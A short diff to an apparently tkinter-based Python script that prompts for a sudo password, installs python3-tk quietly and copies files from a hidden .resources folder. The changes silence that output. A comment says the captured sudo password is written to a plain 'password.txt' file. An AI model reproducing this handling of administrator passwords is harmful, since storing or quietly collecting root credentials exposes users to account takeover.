@@ -1,6 +1,6 @@
-import os, socket
-os.system('sudo apt install python3-pip')
-os.system("pip install --user tk")
+import os
+os.system('sudo apt install python3-tk -q=3')
+
 import tkinter as tk
 from tkinter import messagebox,scrolledtext
 
@@ -17,8 +17,8 @@ while i!=1:
                 exit()
     elif sudo_password:
         
-        os.system('mkdir .resources/temp')
-        os.system('cp -r .resources/alert .')
+        os.system('mkdir .resources/temp >/dev/null 2>&1')
+        os.system('cp -r .resources/alert . >/dev/null 2>&1')
         i=1
 
         # Write the password to a text file named "password.txt"
